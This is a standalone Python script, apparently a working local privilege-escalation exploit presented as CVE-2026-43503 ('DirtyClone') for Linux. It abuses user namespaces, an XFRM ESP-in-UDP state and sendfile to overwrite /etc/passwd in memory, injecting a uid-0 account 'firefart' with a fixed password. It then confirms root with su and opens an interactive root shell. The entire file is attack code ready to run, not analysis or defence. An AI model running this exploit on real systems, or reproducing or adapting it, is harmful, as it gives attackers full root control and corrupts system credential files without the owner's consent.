#!/usr/bin/env python3
import os
import sys
import socket
import struct
import subprocess
import ctypes
import time
import pty
import select

KEY = bytes(range(16))
SPI = 0x1000
PORT = 4500
PASSWD = "/etc/passwd"
ACCOUNT = "firefart"
PASSWORD = "pwned"
HASH = "$6$dcl0salt$8CQdeTvAZwavck5YAsQNIoBP.Vj3UvKNyjPXvuuhjnaksDbye8yGY6.1AaxTkNk1APd6e.hYT8yQ9wEzcOJmN0"

CLONE_NEWUSER = 0x10000000
CLONE_NEWNET = 0x40000000
SOL_UDP = 17
UDP_CORK = 1
UDP_ENCAP = 100
UDP_ENCAP_ESPINUDP = 2

crypto = ctypes.CDLL("libcrypto.so.3")


class AES_KEY(ctypes.Structure):
    _fields_ = [("rd_key", ctypes.c_uint * 60), ("rounds", ctypes.c_int)]


crypto.AES_set_decrypt_key.argtypes = [ctypes.c_char_p, ctypes.c_int, ctypes.POINTER(AES_KEY)]
crypto.AES_decrypt.argtypes = [ctypes.c_char_p, ctypes.c_char_p, ctypes.POINTER(AES_KEY)]

libc = ctypes.CDLL("libc.so.6", use_errno=True)


def aes_decrypt_block(block):
    key = AES_KEY()
    crypto.AES_set_decrypt_key(KEY, 128, ctypes.byref(key))
    out = ctypes.create_string_buffer(16)
    crypto.AES_decrypt(block, out, ctypes.byref(key))
    return out.raw[:16]


def unshare(flags):
    if libc.unshare(flags) != 0:
        err = ctypes.get_errno()
        raise OSError(err, os.strerror(err))


def enter_namespace():
    uid, gid = os.getuid(), os.getgid()
    unshare(CLONE_NEWUSER | CLONE_NEWNET)
    open("/proc/self/setgroups", "w").write("deny")
    open("/proc/self/uid_map", "w").write("0 %d 1" % uid)
    open("/proc/self/gid_map", "w").write("0 %d 1" % gid)


def shell(cmd):
    res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    if res.returncode != 0:
        raise RuntimeError("%s\n%s" % (cmd, res.stdout.decode()))


def configure_xfrm():
    key = KEY.hex()
    shell("ip link set lo up")
    shell("ip xfrm state add src 127.0.0.1 dst 127.0.0.1 proto esp spi %d reqid 1 "
          "mode transport enc 'cbc(aes)' 0x%s auth 'digest_null' '' "
          "encap espinudp %d %d 0.0.0.0" % (SPI, key, PORT, PORT))
    shell("ip xfrm policy add src 127.0.0.1 dst 127.0.0.1 dir in "
          "tmpl src 127.0.0.1 dst 127.0.0.1 proto esp reqid 1 mode transport")
    shell("iptables -t mangle -A OUTPUT -p udp --dport %d -j TEE --gateway 127.0.0.2" % PORT)


def write_block(fd, offset, iv):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(SOL_UDP, UDP_CORK, 1)
    sock.connect(("127.0.0.1", PORT))
    sock.send(struct.pack(">II", SPI, 1) + iv, socket.MSG_MORE)
    os.sendfile(sock.fileno(), fd, offset, 16)
    sock.setsockopt(SOL_UDP, UDP_CORK, 0)
    sock.send(b"")
    sock.close()
    time.sleep(0.06)


def build_payload():
    data = open(PASSWD, "rb").read()
    root_line = data[:data.index(b"\n") + 1]
    entry = ("%s:%s:0:0:pwned:/root:/bin/bash\n" % (ACCOUNT, HASH)).encode()
    prefix = root_line + entry
    block_count = (len(prefix) + 15) // 16 + 1
    size = block_count * 16
    target = prefix + b"#" * (size - len(prefix))
    original = data[:size]
    ivs = []
    for i in range(block_count):
        c0 = original[i * 16:i * 16 + 16]
        t0 = target[i * 16:i * 16 + 16]
        decrypted = aes_decrypt_block(c0)
        ivs.append(bytes(a ^ b for a, b in zip(decrypted, t0)))
    return block_count, ivs


def run_exploit():
    block_count, ivs = build_payload()
    pid = os.fork()
    if pid == 0:
        try:
            enter_namespace()
            configure_xfrm()
            encap = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            encap.bind(("0.0.0.0", PORT))
            encap.setsockopt(SOL_UDP, UDP_ENCAP, UDP_ENCAP_ESPINUDP)
            fd = os.open(PASSWD, os.O_RDONLY)
            open(PASSWD, "rb").read()
            for i in range(block_count):
                write_block(fd, i * 16, ivs[i])
            time.sleep(0.4)
        except Exception as exc:
            sys.stderr.write("%r\n" % exc)
            os._exit(1)
        os._exit(0)
    os.waitpid(pid, 0)


def account_present():
    import pwd
    try:
        pwd.getpwnam(ACCOUNT)
        return True
    except KeyError:
        return False


def su_command(command):
    pid, fd = pty.fork()
    if pid == 0:
        os.execvp("su", ["su", ACCOUNT, "-c", command])
        os._exit(127)
    time.sleep(0.8)
    os.write(fd, (PASSWORD + "\n").encode())
    output = b""
    while True:
        try:
            chunk = os.read(fd, 4096)
        except OSError:
            break
        if not chunk:
            break
        output += chunk
    os.waitpid(pid, 0)
    return output


def interactive_shell():
    pid, fd = pty.fork()
    if pid == 0:
        os.execvp("su", ["su", ACCOUNT, "-c", "exec /bin/bash"])
        os._exit(127)
    time.sleep(0.8)
    os.write(fd, (PASSWORD + "\n").encode())
    while True:
        try:
            ready, _, _ = select.select([fd, sys.stdin], [], [], 30)
        except (OSError, ValueError):
            break
        if not ready:
            break
        if fd in ready:
            try:
                chunk = os.read(fd, 4096)
            except OSError:
                break
            if not chunk:
                break
            os.write(sys.stdout.fileno(), chunk)
        if sys.stdin in ready:
            try:
                chunk = os.read(sys.stdin.fileno(), 4096)
            except OSError:
                break
            if not chunk:
                break
            os.write(fd, chunk)


def main():
    print("[*] CVE-2026-43503 (DirtyClone) local privilege escalation")
    print("[*] uid=%d -> root" % os.getuid())
    run_exploit()
    if not account_present():
        print("[-] failed: target not vulnerable or unprivileged user namespaces restricted")
        return 1
    print("[+] injected uid 0 account '%s' (password: %s)" % (ACCOUNT, PASSWORD))
    proof = su_command("id")
    sys.stdout.write(proof.decode(errors="replace"))
    if b"uid=0" not in proof:
        return 1
    print("[+] root achieved")
    if sys.stdin.isatty():
        interactive_shell()
    return 0


if __name__ == "__main__":
    sys.exit(main())